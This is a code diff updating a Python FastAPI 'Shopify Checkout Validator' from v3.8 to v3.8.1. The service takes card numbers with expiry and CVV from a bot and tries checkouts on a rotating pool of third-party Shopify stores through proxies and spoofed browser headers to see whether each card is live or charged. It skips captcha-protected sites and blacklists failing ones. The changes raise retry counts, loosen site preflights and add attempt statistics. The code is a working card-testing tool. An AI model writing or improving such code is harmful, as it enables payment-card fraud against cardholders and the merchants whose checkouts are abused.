@@ -1,15 +1,13 @@
 """
-Shopify Checkout Validator API — VPS Edition v3.8
+Shopify Checkout Validator API — VPS Edition v3.8.1
 
-Fully autonomous site selection:
-  - The bot makes ONE call per card.
-  - The API filters its healthy pool, tries each site until it gets a real
-    card response, and returns that.
-  - Individual site failures (captcha, no products, price-too-high,
-    no session token, blacklisted) are consumed internally and the API
-    just tries the next site.
-  - The bot never sees site errors — only real card responses or a single
-    "pool exhausted" message after all attempts fail.
+Fully autonomous site selection with lean preflights:
+  - Bot makes ONE call per card; API rotates through healthy sites internally.
+  - Preflight checks: blacklist, no-products, captcha, price ceiling.
+  - Session preflight only fails if /cart/add.js fails (token extraction
+    is not used as a signal because the real flow is more reliable).
+  - PROXY_STOP_CODES = {PROXY_ERROR} — TIMEOUT now skips to next site.
+  - /auto-diagnostics exposes internal attempt statistics.
 """
 
 import asyncio
@@ -45,7 +43,7 @@ MIN_AMOUNT            = float(os.environ.get("MIN_AMOUNT", 0.50))
 HARD_MAX_PRICE        = float(os.environ.get("HARD_MAX_PRICE", 20.0))
 SITE_CONCURRENCY      = int(os.environ.get("SITE_CONCURRENCY", 15))
 RACE_COUNT            = int(os.environ.get("RACE_COUNT", 3))
-AUTO_ATTEMPTS         = int(os.environ.get("AUTO_ATTEMPTS", 8))
+AUTO_ATTEMPTS         = int(os.environ.get("AUTO_ATTEMPTS", 15))
 BLACKLIST_THRESHOLD   = float(os.environ.get("BLACKLIST_THRESHOLD", 0.85))
 BLACKLIST_SAMPLES     = int(os.environ.get("BLACKLIST_SAMPLES", 8))
 BLACKLIST_SECONDS     = int(os.environ.get("BLACKLIST_SECONDS", 300))
@@ -100,9 +98,8 @@ FINAL_CODES = frozenset({
     "LOST_CARD", "RESTRICTED_CARD",
 })
 
-# When these hit, the API stops rotating sites because the proxy itself
-# is the problem — we hand control back to the bot so it can rotate proxy.
-PROXY_STOP_CODES = frozenset({"PROXY_ERROR", "TIMEOUT"})
+# v3.8.1: TIMEOUT removed. Only a genuine proxy failure stops the rotation.
+PROXY_STOP_CODES = frozenset({"PROXY_ERROR"})
 
 LIVE_RESPONSES = frozenset({
     "ORDER_PLACED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
@@ -467,7 +464,7 @@ async def lifespan(app: FastAPI):
     _reload_cards()
     _reload_site_pool()
     log.warning(
-        "Shopify Validator API v3.8 started concurrency=%d/site keys=%d race=%d pool=%d impersonate=%s hard_max=$%.2f auto_attempts=%d",
+        "Shopify Validator API v3.8.1 started concurrency=%d/site keys=%d race=%d pool=%d impersonate=%s hard_max=$%.2f auto_attempts=%d",
         SITE_CONCURRENCY, len(VALID_API_KEYS), RACE_COUNT, len(_site_pool),
         IMPERSONATE, HARD_MAX_PRICE, AUTO_ATTEMPTS,
     )
@@ -480,7 +477,7 @@ async def lifespan(app: FastAPI):
             await res
 
 
-app = FastAPI(title="Shopify Validator", version="3.8.0", lifespan=lifespan)
+app = FastAPI(title="Shopify Validator", version="3.8.1", lifespan=lifespan)
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -922,13 +919,20 @@ async def _site_has_captcha(base_url: str, session: LoggedSession) -> bool:
 
 
 # ---------------------------------------------------------------------------
-# Session-token preflight
+# Session-token preflight (LENIENT — v3.8.1)
 # ---------------------------------------------------------------------------
 async def _check_session_creation(
     base_url: str,
     variant_id: str,
     session: LoggedSession,
 ) -> bool:
+    """
+    Lenient check:
+      - Warm-up homepage first (sets cookies).
+      - Only flags the site if /cart/add.js fails.
+      - Missing token alone is NOT fatal (real flow adds warm-up +
+        proper headers and usually succeeds).
+    """
     if not variant_id:
         return False
 
@@ -940,60 +944,66 @@ async def _check_session_creation(
         "Content-Type": "application/json",
         "Origin": base_url,
         "Referer": f"{base_url}/",
+        "sec-ch-ua": '"Chromium";v="124", "Not_A.Brand";v="24"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
     }
 
     try:
-        cart_ok = False
-        for payload, ct in [
-            (f"id={variant_id}&quantity=1", "application/x-www-form-urlencoded"),
-            (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}), "application/json"),
-        ]:
-            try:
-                r = await session.post(
-                    f"{base_url}/cart/add.js",
-                    data=payload,
-                    headers={**base_headers, "Content-Type": ct, "Accept": "application/json"},
-                    timeout=12,
-                )
-                if r.status_code == 200:
-                    cart_ok = True
-                    break
-            except Exception:
-                continue
+        await session.get(
+            base_url,
+            headers=_ua_headers(ua),
+            allow_redirects=True,
+            timeout=10,
+        )
+        await asyncio.sleep(0.15)
+    except Exception:
+        pass
 
-        if not cart_ok:
-            return False
-
+    cart_ok = False
+    for payload, ct in [
+        (f"id={variant_id}&quantity=1", "application/x-www-form-urlencoded"),
+        (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}), "application/json"),
+    ]:
         try:
-            cr = await session.post(
-                f"{base_url}/checkout/",
-                allow_redirects=True,
-                headers={
-                    **base_headers,
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                },
-                timeout=15,
+            r = await session.post(
+                f"{base_url}/cart/add.js",
+                data=payload,
+                headers={**base_headers, "Content-Type": ct, "Accept": "application/json"},
+                timeout=12,
             )
+            if r.status_code == 200:
+                cart_ok = True
+                break
         except Exception:
-            return False
+            continue
 
+    if not cart_ok:
+        return False
+
+    try:
+        cr = await session.post(
+            f"{base_url}/checkout/",
+            allow_redirects=True,
+            headers={
+                **base_headers,
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            },
+            timeout=15,
+        )
         if cr.status_code != 200:
             return False
-
-        checkout_url = str(cr.url).lower()
-        if "login" in checkout_url or "/account" in checkout_url or "password" in checkout_url:
+        cu = str(cr.url).lower()
+        if "login" in cu or "/account" in cu or "password" in cu:
             return False
+    except Exception:
+        return True
 
-        sst = _extract_sst(cr.text or "", dict(cr.headers))
-        return bool(sst)
-
-    except Exception as ex:
-        log.debug("[_check_session_creation] %s -> %s", base_url, ex)
-        return False
+    return True
 
 
 # ---------------------------------------------------------------------------
-# Product fetching (with all preflight checks)
+# Product fetching
 # ---------------------------------------------------------------------------
 async def _fetch_products(
     base_url: str,
@@ -1078,7 +1088,6 @@ async def _fetch_products(
                 _product_cache[hostname] = {"product": None, "candidates": [], "err": "No products found", "ts": now}
                 return None, [], "No products found"
 
-            # Preflight 1: captcha
             last_cap_check = q.get("captcha_checked_at", 0)
             if (now - last_cap_check) > NO_PRODUCT_TTL:
                 captcha = await _site_has_captcha(base_url, session)
@@ -1094,7 +1103,6 @@ async def _fetch_products(
                 }
                 return None, [], err
 
-            # Preflight 2: price ceiling
             if cheapest_any_price != float("inf"):
                 q["cheapest_price"] = cheapest_any_price
                 q["cheapest_checked_at"] = now
@@ -1109,7 +1117,6 @@ async def _fetch_products(
                     }
                     return None, [], err
 
-            # Preflight 3: session token
             if cheapest_any is not None:
                 last_st_check = q.get("session_checked_at", 0)
                 if (now - last_st_check) > NO_PRODUCT_TTL:
@@ -1119,7 +1126,7 @@ async def _fetch_products(
                     q["can_create_session"] = can_session
                     q["session_checked_at"] = now
                     if not can_session:
-                        log.warning("[preflight] %s cannot create session token — skipping site", hostname)
+                        log.warning("[preflight] %s cart-add failed — skipping site", hostname)
 
                 if q.get("can_create_session") is False:
                     err = "NO_SESSION_TOKEN"
@@ -2026,22 +2033,11 @@ async def _auto_validate(
     max_attempts: int = AUTO_ATTEMPTS,
     exclude: Optional[list[str]] = None,
 ) -> dict:
-    """
-    Try multiple healthy sites until one returns a real card response.
-
-    Behaviour:
-      - Filters the pool through _site_usable (skips captcha, price-too-high,
-        no-products, no-session, blacklisted).
-      - Tries each candidate in random order.
-      - Card response (FINAL_CODES) → return immediately.
-      - Proxy error (PROXY_STOP_CODES) → return immediately (bot rotates proxy).
-      - Any other site error → skip and try the next site.
-      - All attempts failed → return one consolidated "pool exhausted" error.
-    """
     exclude_set = set(exclude or [])
     t0 = time.time()
 
-    # Build the candidate list from the healthy pool
+    _stats["auto_total_cards"] += 1
+
     candidates: list[str] = []
     for site in _site_pool:
         if site in exclude_set:
@@ -2051,8 +2047,6 @@ async def _auto_validate(
         if usable:
             candidates.append(site)
 
-    # If everything is filtered out, fall back to the full pool so we don't
-    # hand the bot a permanent "no sites" error
     if not candidates:
         candidates = [s for s in _site_pool if s not in exclude_set]
 
@@ -2077,6 +2071,8 @@ async def _auto_validate(
 
     for site in candidates:
         attempted += 1
+        _stats["auto_total_attempts"] += 1
+
         result = await validate_card(
             cc, month, year, cvv, site,
             proxy_str=proxy_str, max_price=max_price,
@@ -2087,24 +2083,24 @@ async def _auto_validate(
         host = urlparse(result.get("Site") or site).netloc
         code = str(result.get("Response", "")).upper()
 
-        # Record for the circuit breaker / quarantine
-        _record_site_result(host, code)
+        _stats[f"auto_site_{code}"] += 1
 
-        # Real card answer → return immediately
+        if code not in HARD_DEAD_CODES:
+            _record_site_result(host, code)
+
         if code in FINAL_CODES:
+            if attempted == 1:
+                _stats["auto_first_try_success"] += 1
             log.info("[auto] SUCCESS on %s after %d attempt(s): %s", host, attempted, code)
             return result
 
-        # Proxy is dead → hand control back so the bot can rotate proxy
         if code in PROXY_STOP_CODES:
             log.info("[auto] proxy error on %s — returning so bot can rotate", host)
             return result
 
-        # Site error → swallow and try next site
         log.info("[auto] attempt %d/%d: %s -> %s, trying next site",
                  attempted, len(candidates), host, code)
 
-    # All attempts exhausted without a real card response
     log.warning("[auto] pool exhausted after %d attempt(s) — last site: %s, last code: %s",
                 attempted, last_site, last_result.get("Response") if last_result else "?")
     return {
@@ -2120,7 +2116,7 @@ async def _auto_validate(
 
 
 # ---------------------------------------------------------------------------
-# Multi-site racing (kept for compatibility)
+# Multi-site racing (compatibility)
 # ---------------------------------------------------------------------------
 async def validate_card_raced(
     cc: str, month: str, year: str, cvv: str,
@@ -2173,28 +2169,17 @@ async def validate_card_raced(
 # ---------------------------------------------------------------------------
 # Routes
 # ---------------------------------------------------------------------------
-
 @app.get("/shopify")
 async def shopify_route(
-    site:           Optional[str] = Query(None, description="Optional primary site — omit for full-auto"),
-    cc:             Optional[str] = Query(None, description="cc|mm|yy|cvv"),
+    site:           Optional[str] = Query(None),
+    cc:             Optional[str] = Query(None),
     proxy:          Optional[str] = Query(None),
     max_price:      Optional[float] = Query(None),
     key:            Optional[str] = Query(None),
     fallback_sites: Optional[str] = Query(None),
-    attempts:       Optional[int] = Query(None, description="Override AUTO_ATTEMPTS"),
-    auto:           Optional[bool] = Query(None, description="Force auto mode even if site is given"),
+    attempts:       Optional[int] = Query(None),
+    auto:           Optional[bool] = Query(None),
 ):
-    """
-    Fully autonomous card validation.
-
-    The bot sends the card and (optionally) a preferred site. The API:
-      1. Tries the preferred site if it looks healthy.
-      2. On any site error (captcha, no products, price-too-high, no session,
-         blacklisted, etc.), automatically rotates to other healthy sites.
-      3. Returns only a real card response, OR one "pool exhausted" error
-         after all attempts fail. Site errors never reach the bot.
-    """
     if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
         return JSONResponse(
             {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
@@ -2212,7 +2197,6 @@ async def shopify_route(
 
     n_attempts = attempts if attempts and attempts > 0 else AUTO_ATTEMPTS
 
-    # Explicit auto override
     if auto is True or not site:
         result = await _auto_validate(
             card["cc"], card["month"], card["year"], card["cvv"],
@@ -2221,7 +2205,6 @@ async def shopify_route(
         _stats[f"auto_response_{result.get('Response', 'UNKNOWN')}"] += 1
         return JSONResponse(result)
 
-    # Try the caller's preferred site first
     primary = await validate_card(
         card["cc"], card["month"], card["year"], card["cvv"],
         site, proxy_str=proxy, max_price=max_price,
@@ -2230,12 +2213,10 @@ async def shopify_route(
     primary_code = str(primary.get("Response", "")).upper()
     _record_site_result(primary_host, primary_code)
 
-    # If the primary gave us a real answer or hit a proxy error, return it
     if primary_code in FINAL_CODES or primary_code in PROXY_STOP_CODES:
         _stats[f"response_{primary_code}"] += 1
         return JSONResponse(primary)
 
-    # Otherwise silently fall back to auto pool (excluding the failed site)
     log.info("[shopify] primary %s -> %s, falling back to auto pool", primary_host, primary_code)
     result = await _auto_validate(
         card["cc"], card["month"], card["year"], card["cvv"],
@@ -2248,7 +2229,7 @@ async def shopify_route(
 
 @app.get("/shopify-race")
 async def shopify_race_route(
-    sites:     str = Query(..., description="Comma-separated site URLs"),
+    sites:     str = Query(...),
     cc:        Optional[str] = Query(None),
     proxy:     Optional[str] = Query(None),
     max_price: Optional[float] = Query(None),
@@ -2294,7 +2275,6 @@ async def check_route(
     max_price: Optional[float] = Query(None),
     key:       Optional[str] = Query(None),
 ):
-    """Single-site check — used by sitechk.py to verify a specific site."""
     if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
         return JSONResponse(
             {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
@@ -2330,6 +2310,37 @@ async def check_route(
         "approved":      result.get("Approved", "False"),
         "charged":       result.get("Charged", "False"),
         "time":          result.get("Time", ""),
+    })
+
+
+# ── AUTO DIAGNOSTICS ──────────────────────────────────────────────────────
+@app.get("/auto-diagnostics")
+async def auto_diagnostics_route():
+    total_cards = _stats.get("auto_total_cards", 0)
+    total_attempts = _stats.get("auto_total_attempts", 0)
+    first_try_success = _stats.get("auto_first_try_success", 0)
+
+    code_breakdown = {}
+    for k, v in _stats.items():
+        if k.startswith("auto_site_"):
+            code_breakdown[k[len("auto_site_"):]] = v
+
+    live_pool = sum(
+        1 for s in _site_pool
+        if _site_usable(urlparse(
+            s if s.startswith("http") else f"https://{s}"
+        ).netloc)[0]
+    )
+
+    return JSONResponse({
+        "total_cards_processed": total_cards,
+        "total_site_attempts":   total_attempts,
+        "avg_attempts_per_card": round(total_attempts / total_cards, 2) if total_cards else 0,
+        "first_try_success":     first_try_success,
+        "first_try_rate":        f"{first_try_success / total_cards * 100:.1f}%" if total_cards else "0%",
+        "internal_site_codes":   code_breakdown,
+        "pool_live":             live_pool,
+        "pool_total":            len(_site_pool),
     })
 
 
@@ -2482,7 +2493,7 @@ async def health_route():
     cards = _get_cards()
     return JSONResponse({
         "status":               "ok",
-        "version":              "3.8.0",
+        "version":              "3.8.1",
         "cards_loaded":         len(cards),
         "site_concurrency":     SITE_CONCURRENCY,
         "cache_ttl":            CACHE_TTL,
